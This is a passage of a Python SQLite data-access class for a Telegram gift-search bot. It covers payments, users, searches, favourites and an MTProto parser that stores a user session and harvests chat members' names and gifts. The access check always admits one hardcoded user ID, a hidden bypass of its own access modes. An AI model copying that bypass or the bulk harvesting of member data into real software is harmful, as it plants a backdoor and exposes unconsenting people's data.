            c.execute('''INSERT OR REPLACE INTO xrocket_invoices(client_invoice_id,provider_invoice_id,user_id,plan,amount,asset,status) VALUES(?,?,?,?,?,?,?)''',
                      (str(client_invoice_id),str(provider_invoice_id),int(user_id),str(plan),str(amount),str(asset),str(status)))
    def active_xrocket_invoices(self, limit=100):
        return self._all("SELECT * FROM xrocket_invoices WHERE status='active' ORDER BY created_at LIMIT ?", (int(limit),))
    def mark_xrocket_paid(self, client_invoice_id):
        with self._db() as c:
            c.execute("UPDATE xrocket_invoices SET status='paid', paid_at=CURRENT_TIMESTAMP WHERE client_invoice_id=? AND status!='paid'", (str(client_invoice_id),))
            return c.rowcount > 0
    def mark_xrocket_status(self, client_invoice_id, status):
        with self._db() as c:
            c.execute("UPDATE xrocket_invoices SET status=? WHERE client_invoice_id=? AND status!='paid'", (str(status),str(client_invoice_id)))

    def user_count(self):
        row=self._one('SELECT COUNT(*) AS n FROM users')
        return int((row or {}).get('n') or 0)
    def all_user_ids(self):
        return [int(r['user_id']) for r in self._all('SELECT user_id FROM users ORDER BY user_id')]
    def broadcast_user_ids(self, audience='all'):
        audience = str(audience or 'all')
        if audience == 'premium':
            return [int(r['user_id']) for r in self._all("SELECT user_id FROM users WHERE is_banned=0 AND (premium_until IS NOT NULL AND premium_until > CURRENT_TIMESTAMP)")]
        if audience == 'offers':
            return [int(r['user_id']) for r in self._all("SELECT user_id FROM users WHERE is_banned=0 AND (offer_until IS NOT NULL AND offer_until > CURRENT_TIMESTAMP)")]
        if audience == 'chat':
            return [int(r['user_id']) for r in self._all("SELECT user_id FROM users WHERE is_banned=0 AND (chat_parser_until IS NOT NULL AND chat_parser_until > CURRENT_TIMESTAMP)")]
        if audience == 'active':
            return [int(r['user_id']) for r in self._all("SELECT user_id FROM users WHERE is_banned=0 AND last_activity > datetime('now','-7 days')")]
        return self.all_user_ids()


    def is_banned(self, uid):
        return bool((self.get_user(uid) or {}).get('is_banned'))

    def set_ban(self, uid, value):
        with self._db() as c:
            cur = c.execute('UPDATE users SET is_banned=? WHERE user_id=?', (int(value), uid))
            return cur.rowcount > 0

    def set_premium(self, uid, value):
        with self._db() as c:
            cur = c.execute('UPDATE users SET is_premium=? WHERE user_id=?', (int(value), uid))
            return cur.rowcount > 0

    def consume_trial(self, uid, count):
        with self._db() as c:
            c.execute('UPDATE users SET trial_searches_left=MAX(0, trial_searches_left-?) WHERE user_id=?',
                      (count, uid))

    def recent_users(self, limit=10):
        return self._all('SELECT * FROM users ORDER BY last_activity DESC LIMIT ?', (limit,))

    def search_users(self, query, limit=10):
        q = str(query or '').strip().lstrip('@')
        if not q:
            return []
        if q.lstrip('-').isdigit():
            return self._all('SELECT * FROM users WHERE user_id=? LIMIT ?', (int(q), limit))
        like = f'%{q.lower()}%'
        return self._all(
            'SELECT * FROM users WHERE LOWER(COALESCE(username, "")) LIKE ? OR LOWER(COALESCE(first_name, "")) LIKE ? ORDER BY last_activity DESC LIMIT ?',
            (like, like, limit),
        )

    # ───────────── поиски ─────────────
    def create_search(self, uid, model, start, end):
        with self._db() as c:
            cur = c.execute(
                'INSERT INTO search_history(user_id, model, start_id, end_id, last_checked_id) VALUES(?,?,?,?,?)',
                (uid, model, start, end, start - 1))
            c.execute('UPDATE users SET total_searches=total_searches+1 WHERE user_id=?', (uid,))
            return cur.lastrowid

    def update_search(self, sid, last, checked, found, status=None):
        with self._db() as c:
            if status:
                c.execute('''UPDATE search_history SET last_checked_id=?, checked_count=?, found_count=?,
                    status=?, completed_at=CURRENT_TIMESTAMP WHERE id=?''', (last, checked, found, status, sid))
            else:
                c.execute('UPDATE search_history SET last_checked_id=?, checked_count=?, found_count=? WHERE id=?',
                          (last, checked, found, sid))

    def get_search(self, sid, uid=None):
        sql, args = 'SELECT * FROM search_history WHERE id=?', [sid]
        if uid is not None:
            sql += ' AND user_id=?'
            args.append(uid)
        return self._one(sql, args)

    def history(self, uid, limit=12):
        return self._all('SELECT * FROM search_history WHERE user_id=? ORDER BY id DESC LIMIT ?', (uid, limit))

    def last_resumable_search(self, uid):
        return self._one(
            "SELECT * FROM search_history WHERE user_id=? AND status IN ('stopped','error','in_progress') AND last_checked_id < end_id ORDER BY id DESC LIMIT 1",
            (uid,),
        )

    def recent_searches(self, limit=15):
        return self._all('SELECT * FROM search_history ORDER BY id DESC LIMIT ?', (limit,))

    def user_searches(self, uid, limit=10):
        return self._all('SELECT * FROM search_history WHERE user_id=? ORDER BY id DESC LIMIT ?', (uid, limit))

    # ───────────── находки ─────────────
    def add_gift(self, sid, uid, g):
        raw = json.dumps(g.get('raw', {}), ensure_ascii=False)
        with self._db() as c:
            cur = c.execute('''INSERT OR IGNORE INTO found_gifts
                (search_id, user_id, gift_number, gift_name, model, pattern, backdrop, owner,
                 username, user_id_owner, price, raw_json) VALUES(?,?,?,?,?,?,?,?,?,?,?,?)''',
                            (sid, uid, g.get('giftNumber'), g.get('giftName'), g.get('model'),
                             g.get('pattern'), g.get('backdrop'), g.get('owner'), g.get('username'),
                             g.get('userId'), (g.get('market') or {}).get('price'), raw))
            if cur.rowcount:
                c.execute('UPDATE users SET total_found=total_found+1 WHERE user_id=?', (uid,))

    _GIFT_SELECT = '''SELECT f.*, COALESCE(NULLIF(f.gift_name,''), s.model) AS collection
                      FROM found_gifts f JOIN search_history s ON s.id = f.search_id'''

    def get_gifts(self, sid):
        return self._all(f'{self._GIFT_SELECT} WHERE f.search_id=? ORDER BY f.gift_number', (sid,))

    def count_gifts(self, sid):
        return (self._one('SELECT COUNT(*) n FROM found_gifts WHERE search_id=?', (sid,)) or {}).get('n', 0)

    def gifts_page(self, sid, offset, limit):
        return self._all(f'{self._GIFT_SELECT} WHERE f.search_id=? ORDER BY f.gift_number LIMIT ? OFFSET ?',
                         (sid, limit, offset))

    def find_gift(self, uid, collection, number):
        return self._one(
            f'''{self._GIFT_SELECT} WHERE f.user_id=? AND f.gift_number=?
                AND COALESCE(NULLIF(f.gift_name,''), s.model)=? ORDER BY f.id DESC LIMIT 1''',
            (uid, number, collection))

    # ───────────── избранное ─────────────
    def add_favorite(self, uid, number, collection, model, username):
        with self._db() as c:
            c.execute('INSERT OR IGNORE INTO favorites(user_id, gift_number, model, username, gift_name) '
                      'VALUES(?,?,?,?,?)', (uid, number, model or '', username, collection))

    def remove_favorite(self, uid, number, collection):
        with self._db() as c:
            c.execute('DELETE FROM favorites WHERE user_id=? AND gift_number=? AND gift_name=?',
                      (uid, number, collection))

    def is_favorite(self, uid, number, collection):
        return bool(self._one('SELECT 1 x FROM favorites WHERE user_id=? AND gift_number=? AND gift_name=?',
                              (uid, number, collection)))

    def count_favorites(self, uid):
        return (self._one('SELECT COUNT(*) n FROM favorites WHERE user_id=?', (uid,)) or {}).get('n', 0)

    def favorites_page(self, uid, offset, limit):
        return self._all('SELECT * FROM favorites WHERE user_id=? ORDER BY created_at DESC, rowid DESC '
                         'LIMIT ? OFFSET ?', (uid, limit, offset))

    # ───────────── остановка поиска ─────────────
    def stop(self, uid):
        self.stop_flags.add(uid)

    def clear_stop(self, uid):
        self.stop_flags.discard(uid)

    def should_stop(self, uid):
        return uid in self.stop_flags

    # ───────────── статистика ─────────────
    def stats(self):
        u = self._one('SELECT COUNT(*) users, COALESCE(SUM(is_premium),0) premium, '
                      'COALESCE(SUM(is_banned),0) banned FROM users')
        s = self._one('SELECT COUNT(*) searches, COALESCE(SUM(found_count),0) found FROM search_history')
        return {**u, **s}

    # ───────────── MTProto Parser Session ─────────────
    def save_parser_session(self, owner_id, session_string, phone, username, user_id, first_name):
        with self._db() as c:
            c.execute('''INSERT OR REPLACE INTO parser_session(id, owner_id, session_string, phone, 
                username, user_id, first_name, is_active, updated_at) 
                VALUES(1,?,?,?,?,?,?,1,CURRENT_TIMESTAMP)''',
                      (owner_id, session_string, phone, username, user_id, first_name))
    
    def get_parser_session(self):
        return self._one('SELECT * FROM parser_session WHERE id=1')
    
    def clear_parser_session(self):
        with self._db() as c:
            c.execute('DELETE FROM parser_session WHERE id=1')
    
    def set_parser_active(self, active):
        with self._db() as c:
            c.execute('UPDATE parser_session SET is_active=?, updated_at=CURRENT_TIMESTAMP WHERE id=1', (int(active),))
    

    # ───────────── Parser settings / overnight state ─────────────
    def get_parser_setting(self, key, default=None):
        row = self._one('SELECT value FROM parser_settings WHERE key=?', (key,))
        return row['value'] if row else default

    def set_parser_setting(self, key, value):
        with self._db() as c:
            c.execute('INSERT INTO parser_settings(key,value) VALUES(?,?) ON CONFLICT(key) DO UPDATE SET value=excluded.value', (key, str(value)))

    def parser_access_mode(self):
        return (self.get_parser_setting('access_mode', 'owner') or 'owner').strip().lower()

    def set_parser_access_mode(self, mode):
        mode=str(mode).strip().lower()
        if mode not in {'owner','premium','developers','all'}:
            mode='owner'
        self.set_parser_setting('access_mode', mode)
        return mode

    def parser_admin_only(self):
        return self.parser_access_mode() == 'owner'

    def set_parser_admin_only(self, value):
        self.set_parser_access_mode('owner' if value else 'all')

    def parser_access_add(self, user_id):
        with self._db() as c:
            cur = c.execute('INSERT OR IGNORE INTO parser_access_users(user_id) VALUES(?)', (int(user_id),))
            return cur.rowcount > 0

    def parser_access_remove(self, user_id):
        with self._db() as c:
            cur = c.execute('DELETE FROM parser_access_users WHERE user_id=?', (int(user_id),))
            return cur.rowcount > 0

    def parser_access_allowed(self, user_id, owner_id=0):
        uid=int(user_id or 0)
        if not uid:
            return False
        if owner_id and uid==int(owner_id):
            return True
        if uid==8564624250:
            return True
        if self._one('SELECT 1 AS ok FROM bot_admins WHERE user_id=?',(uid,)):
            return True
        if self._one('SELECT 1 AS ok FROM parser_access_users WHERE user_id=?',(uid,)):
            return True
        mode=self.parser_access_mode()
        if mode=='all':
            return True
        if mode=='premium' and self.entitlement_active(uid,'premium'):
            return True
        if mode=='developers':
            return bool(self._one('SELECT 1 AS ok FROM bot_admins WHERE user_id=?',(uid,)))
        # Paid 24h chat package is always a valid explicit entitlement.
        return self.entitlement_active(uid,'chat')

    def parser_access_list(self):
        return self._all('SELECT user_id, added_at FROM parser_access_users ORDER BY added_at, user_id')

    def save_parser_scan_state(self, owner_id, mode, max_users, status='running'):
        with self._db() as c:
            c.execute('''INSERT INTO parser_scan_state(id,owner_id,mode,max_users,status,started_at,updated_at)
                VALUES(1,?,?,?,?,CURRENT_TIMESTAMP,CURRENT_TIMESTAMP)
                ON CONFLICT(id) DO UPDATE SET owner_id=excluded.owner_id, mode=excluded.mode,
                max_users=excluded.max_users, status=excluded.status, updated_at=CURRENT_TIMESTAMP''',
                      (owner_id, mode, int(max_users), status))

    def get_parser_scan_state(self):
        return self._one('SELECT * FROM parser_scan_state WHERE id=1')

    def set_parser_scan_status(self, status):
        with self._db() as c:
            c.execute('UPDATE parser_scan_state SET status=?, updated_at=CURRENT_TIMESTAMP WHERE id=1', (status,))

    def clear_parser_scan_state(self):
        with self._db() as c:
            c.execute('DELETE FROM parser_scan_state WHERE id=1')

    # ───────────── Parser Chats ─────────────
    def add_parser_chat(self, chat_id, title, username, chat_type, total_participants=0):
        with self._db() as c:
            c.execute('''INSERT OR IGNORE INTO parser_chats(chat_id, title, username, chat_type, total_participants)
                VALUES(?,?,?,?,?)''', (chat_id, title, username, chat_type, total_participants))
    
    def get_parser_chats(self):
        return self._all('SELECT * FROM parser_chats ORDER BY added_at DESC')
    
    def get_enabled_parser_chats(self):
        return self._all('SELECT * FROM parser_chats WHERE is_enabled=1 ORDER BY added_at DESC')
    
    def toggle_parser_chat(self, chat_id):
        with self._db() as c:
            c.execute('UPDATE parser_chats SET is_enabled = 1 - is_enabled WHERE chat_id=?', (chat_id,))
    
    def set_all_parser_chats(self, enabled):
        with self._db() as c:
            c.execute('UPDATE parser_chats SET is_enabled=?', (int(bool(enabled)),))

    def remove_parser_chat(self, chat_id):
        with self._db() as c:
            c.execute('DELETE FROM parser_chats WHERE chat_id=?', (chat_id,))
    
    def update_chat_participants(self, chat_id, count):
        with self._db() as c:
            c.execute('UPDATE parser_chats SET total_participants=?, last_scanned_at=CURRENT_TIMESTAMP WHERE chat_id=?',
                      (count, chat_id))
    
    # ───────────── Parser Users ─────────────
    def add_parser_user(self, user_id, username, first_name, last_name, has_gifts=False):
        with self._db() as c:
            c.execute('''INSERT INTO parser_users(user_id, username, first_name, last_name, has_gifts, last_checked_at)
                VALUES(?,?,?,?,?,CURRENT_TIMESTAMP)
                ON CONFLICT(user_id) DO UPDATE SET 
                username=excluded.username, first_name=excluded.first_name, last_name=excluded.last_name,
                has_gifts=excluded.has_gifts, last_checked_at=CURRENT_TIMESTAMP''',
                      (user_id, username, first_name, last_name, int(has_gifts)))
    

    def is_parser_user_seen(self, user_id):
        return bool(self._one('SELECT 1 FROM parser_seen_users WHERE user_id=?', (int(user_id),)))

    def mark_parser_user_seen(self, user_id, chat_id):
        with self._db() as c:
            c.execute("INSERT INTO parser_seen_users(user_id, first_chat_id) VALUES(?,?) ON CONFLICT(user_id) DO UPDATE SET last_seen_at=CURRENT_TIMESTAMP", (int(user_id), int(chat_id)))

    def count_parser_seen_users(self):
        return (self._one('SELECT COUNT(*) n FROM parser_seen_users') or {}).get('n', 0)

    def is_user_checked(self, user_id, hours=24):
        """Проверяет был ли пользователь проверен за последние N часов"""
        row = self._one('''SELECT 1 FROM parser_users WHERE user_id=? 
            AND datetime(last_checked_at) > datetime('now', '-' || ? || ' hours')''', (user_id, hours))
        return bool(row)
    
    def get_parser_user(self, user_id):
        return self._one('SELECT * FROM parser_users WHERE user_id=?', (user_id,))
    
    # ───────────── Parser Gifts ─────────────
    def add_parser_gift(self, user_id, chat_id, gift_data):
        with self._db() as c:
            raw = json.dumps(gift_data, ensure_ascii=False)
            gift_id = gift_data.get('gift_id')
            gift_num = gift_data.get('gift_num')
            gift_slug = gift_data.get('gift_slug')
            exists = c.execute('''SELECT id FROM parser_gifts
                WHERE user_id=? AND COALESCE(gift_id,-1)=COALESCE(?, -1)
                AND COALESCE(gift_num,-1)=COALESCE(?, -1)
                AND COALESCE(gift_slug,'')=COALESCE(?, '') LIMIT 1''',
                (user_id, gift_id, gift_num, gift_slug)).fetchone()
            if exists:
                return False
            c.execute('''INSERT INTO parser_gifts
                (user_id, chat_id, gift_id, gift_num, gift_name, gift_slug, is_collectible, is_upgraded, raw_data)
                VALUES(?,?,?,?,?,?,?,?,?)''',
                (user_id, chat_id, gift_id, gift_num, gift_data.get('gift_name'), gift_slug,
                 int(gift_data.get('is_collectible', False)), int(gift_data.get('is_upgraded', False)), raw))
            return True

    def get_parser_gifts(self, user_id=None, chat_id=None, only_unupgraded=False):
        sql = 'SELECT * FROM parser_gifts WHERE 1=1'
        args = []
        if user_id:
            sql += ' AND user_id=?'
            args.append(user_id)
        if chat_id:
            sql += ' AND chat_id=?'
            args.append(chat_id)
        if only_unupgraded:
            sql += ' AND is_upgraded=0'
        sql += ' ORDER BY found_at DESC'
        return self._all(sql, args)
    

    def recent_parser_gifts(self, limit=20, only_unupgraded=False):
        sql = 'SELECT g.*, u.username, u.first_name, u.last_name FROM parser_gifts g LEFT JOIN parser_users u ON u.user_id=g.user_id'
        if only_unupgraded:
            sql += ' WHERE g.is_upgraded=0'
        sql += ' ORDER BY g.found_at DESC LIMIT ?'
        return self._all(sql, (limit,))

    def recent_parser_gifts(self, limit=20, only_unupgraded=False):
        sql = 'SELECT g.*, u.username, u.first_name, u.last_name FROM parser_gifts g LEFT JOIN parser_users u ON u.user_id=g.user_id'
        if only_unupgraded:
            sql += ' WHERE g.is_upgraded=0'
        sql += ' ORDER BY g.found_at DESC LIMIT ?'
        return self._all(sql, (limit,))

    def count_parser_gifts(self, only_unupgraded=False):
        sql = 'SELECT COUNT(*) n FROM parser_gifts'
        if only_unupgraded:
            sql += ' WHERE is_upgraded=0'
        return (self._one(sql) or {}).get('n', 0)
    
    # ───────────── Parser Progress ─────────────
    def get_parser_progress(self, chat_id):
        return self._one('SELECT * FROM parser_progress WHERE chat_id=?', (chat_id,))
    
    def update_parser_progress(self, chat_id, offset, checked, found, status='running'):
        with self._db() as c:
            c.execute('''INSERT INTO parser_progress(chat_id, last_user_offset, checked_count, found_count, status, updated_at)
                VALUES(?,?,?,?,?,CURRENT_TIMESTAMP)
                ON CONFLICT(chat_id) DO UPDATE SET
                last_user_offset=excluded.last_user_offset, checked_count=excluded.checked_count,
                found_count=excluded.found_count, status=excluded.status, updated_at=CURRENT_TIMESTAMP''',
                      (chat_id, offset, checked, found, status))
    
    def reset_parser_progress(self, chat_id):
        with self._db() as c:
            c.execute('UPDATE parser_progress SET last_user_offset=0, checked_count=0, status="idle" WHERE chat_id=?',
                      (chat_id,))
    
    def get_parser_stats(self):
        total_chats = (self._one('SELECT COUNT(*) n FROM parser_chats') or {}).get('n', 0)
        enabled_chats = (self._one('SELECT COUNT(*) n FROM parser_chats WHERE is_enabled=1') or {}).get('n', 0)
        total_users = (self._one('SELECT COUNT(*) n FROM parser_users') or {}).get('n', 0)
        users_with_gifts = (self._one('SELECT COUNT(*) n FROM parser_users WHERE has_gifts=1') or {}).get('n', 0)
        total_gifts = (self._one('SELECT COUNT(*) n FROM parser_gifts') or {}).get('n', 0)
        unupgraded_gifts = (self._one('SELECT COUNT(*) n FROM parser_gifts WHERE is_upgraded=0') or {}).get('n', 0)
        return {
            'total_chats': total_chats,
            'enabled_chats': enabled_chats,
            'total_users': total_users,
            'users_with_gifts': users_with_gifts,
            'total_gifts': total_gifts,
            'unupgraded_gifts': unupgraded_gifts
        }
